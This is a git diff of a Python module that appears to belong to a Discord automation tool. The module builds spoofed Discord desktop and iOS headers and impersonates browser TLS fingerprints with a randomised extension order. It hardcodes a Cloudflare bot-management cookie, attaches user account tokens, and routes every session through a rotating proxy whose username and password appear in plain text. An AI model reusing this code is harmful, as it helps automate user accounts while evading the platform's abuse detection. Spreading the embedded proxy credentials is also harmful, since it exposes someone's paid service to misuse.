@@ -3,13 +3,11 @@ from .utils import *
 from .logger import *
 from core import *
 
+# couldnt import them dont judge 
 PINK = "\033[38;5;176m"
 MAGENTA = "\033[38;5;97m"
 WHITE = "\u001b[37m"
 def make_menu(*options):
-    PINK = "\033[38;5;176m"
-    MAGENTA = "\033[38;5;97m"
-    WHITE = "\u001b[37m"
     print()
     for num, option in enumerate(options, start=1):
         label = f"    {PINK}[{MAGENTA}{num}{PINK}] {WHITE}{option}"
@@ -22,6 +20,7 @@ class IOS_headers:
         self.darwin_ver = self.get_darwin_version()
         self.iv1, self.iv2 = str(randint(15, 16)), str(randint(1, 5))
         self.app_version = self.get_app_version()
+        set_title("Getting Discord IOS Info")
         log.info(f"Getting Discord IOS Info")
         sleep(0.2)
         self.build_number = self.get_build_number()
@@ -101,6 +100,7 @@ class IOS_headers:
 
 class WIN_headers:
     def __init__(self):
+        set_title("Getting Discord Desktop Info")
         log.info(f"Getting Discord Desktop Info")
         sleep(0.2)
         self.native_buildd = self.native_build()
@@ -203,36 +203,59 @@ class WIN_headers:
     def __call__(self):
         return self.dict
 
-class Client:
-    def __init__(self, typee):
-        self.type = typee
-        self.iv1, self.iv2 = str(randint(15, 16)), str(randint(1, 5))
+def get_headers():
+    typ = config.get("header_typ")
+    heads = {
+        "win": WIN_headers,
+        "ios": IOS_headers,
+    }
 
-        typess = {
-            "win": {
-                "headers": WIN_headers,
-                "client_identifier": "chrome_108",
-            },
-            "ios": {
-                "headers": IOS_headers,
-                "client_identifier": f"safari_ios_{self.iv1}_{self.iv2}",
-            },
+    if typ == "":
+        log.info("No Headers Type Selected, Please Choose One")
+        make_menu("Window Headers", "IOS Headers")
+        head = input(f"{PINK}[{MAGENTA}Choice{PINK}]{MAGENTA} -> ")
+        choice_map = {
+            "1": "win",
+            "2": "ios"
         }
-
-        if self.type in typess:
-            config = typess[self.type]
+        if head in choice_map:
+            config._set("header_typ", choice_map[head])
         else:
-            config = {"headers": WIN_headers, "client_identifier": "chrome_108"}
+            log.failure("Invalid Option")
+            sleep(1)
+            get_headers()
+    elif typ in heads:
+        return heads[typ]()()
+    else:
+        log.failure("Invalid Option")
+        sleep(1)
+        get_headers()
 
-        self.headers = config["headers"]()()
-        self.session = tls_client.Session(
-            client_identifier=config["client_identifier"],
-            random_tls_extension_order=True
-        )
+headers = {
+  "authority": "discord.com",
+  "accept": "*/*",
+  "accept-language": "en,en-US;q=0.9",
+  "content-type": "application/json",
+  "origin": "https://discord.com",
+  "referer": "https://discord.com/",
+  "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"",
+  "sec-ch-ua-mobile": "?0",
+  "sec-ch-ua-platform": "\"Windows\"",
+  "sec-fetch-dest": "empty",
+  "sec-fetch-mode": "cors",
+  "sec-fetch-site": "same-origin",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9030 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
+  "x-debug-options": "bugReporterEnabled",
+  "x-discord-locale": "en-US",
+  "x-discord-timezone": "Europe/Stockholm",
+  "x-super-properties": "eyJvcyI6ICJXaW5kb3dzIiwgImJyb3dzZXIiOiAiRGlzY29yZCBDbGllbnQiLCAicmVsZWFzZV9jaGFubmVsIjogInN0YWJsZSIsICJjbGllbnRfdmVyc2lvbiI6ICIxLjAuOTAzMCIsICJvc192ZXJzaW9uIjogIjEwLjAuMTkwNDUiLCAib3NfYXJjaCI6ICJ4NjQiLCAiYXBwX2FyY2giOiAiaWEzMiIsICJzeXN0ZW1fbG9jYWxlIjogImVuIiwgImJyb3dzZXJfdXNlcl9hZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgZGlzY29yZC8xLjAuOTAzMCBDaHJvbWUvMTA4LjAuNTM1OS4yMTUgRWxlY3Ryb24vMjIuMy4yNiBTYWZhcmkvNTM3LjM2IiwgImJyb3dzZXJfdmVyc2lvbiI6ICIyMi4zLjI2IiwgImNsaWVudF9idWlsZF9udW1iZXIiOiAyNTk1MDEsICJuYXRpdmVfYnVpbGRfbnVtYmVyIjogNDI2NTYsICJjbGllbnRfZXZlbnRfc291cmNlIjogbnVsbCwgImRlc2lnbl9pZCI6IDB9"
+}
 
-    def get_cookies(self):
+class Client:
+    @staticmethod
+    def get_cookies(session):
         cookies = dict(
-            self.session.get("https://discord.com").cookies
+            session.get("https://discord.com").cookies
         )
         cookies["__cf_bm"] = (
             "0duPxpWahXQbsel5Mm.XDFj_eHeCKkMo.T6tkBzbIFU-1679837601-0-"
@@ -241,44 +264,29 @@ class Client:
         cookies["locale"] = "en-US"
         return cookies
 
-    def get_session(self, token=""):
-        session = self.session
-        cookie = self.get_cookies()
-        session.headers = self.headers
-        if token == "":
-            pass
-        else:
-            session.headers.update({"Authorization": token})
+    @staticmethod
+    def get_session(token:str):
+        typ = config.get("header_typ")
+        iv1, iv2 = str(randint(15,16)), str(randint(1,5))
+        idents = {
+            "ios": f"safari_ios_{iv1}_{iv2}",
+            "win": "chrome_108"
+        }
+        ident = idents.get(typ)
+        session = tls_client.Session(
+            client_identifier = ident,
+            random_tls_extension_order = True
+        )
+        
+        cookie = Client.get_cookies(session)
+        session.headers = headers
+        session.headers.update({"Authorization": token})
         session.headers.update({
             "cookie": f"__cfruid={cookie['__cfruid']}; __dcfduid={cookie['__dcfduid']}; __sdcfduid={cookie['__sdcfduid']}",
         })
-        session.cookies = cookie
+        session.proxies = {
+            "http": f"http://3e8j8h0vylsx49g:54nw544u7iglpsm@rp.proxyscrape.com:6060", 
+            "https": f"http://3e8j8h0vylsx49g:54nw544u7iglpsm@rp.proxyscrape.com:6060"
+        }
 
         return session
-
-    def get_client():
-        heads = {
-            "1": "win",
-            "2": "ios"
-        }
-    
-        typ = config.get("header_typ")
-        if typ == "":
-            log.info("No Headers Type Selected, Please Choose One")
-            make_menu("Window Headers", "IOS Headers")
-            head = input(f"{PINK}[{MAGENTA}Choice{PINK}]{MAGENTA} -> ")
-    
-            if head in heads:
-                head_typ = heads[head]
-                config._set("header_typ", head_typ)
-                log.info(f"Set Headers To {head_typ.capitalize()}")
-                sleep(1)
-                return Client(head_typ)
-            else:
-                log.warning("Invalid Headers Type")
-                return
-        elif typ in heads.values():
-            return Client(typ)
-
-
-client = Client.get_client()
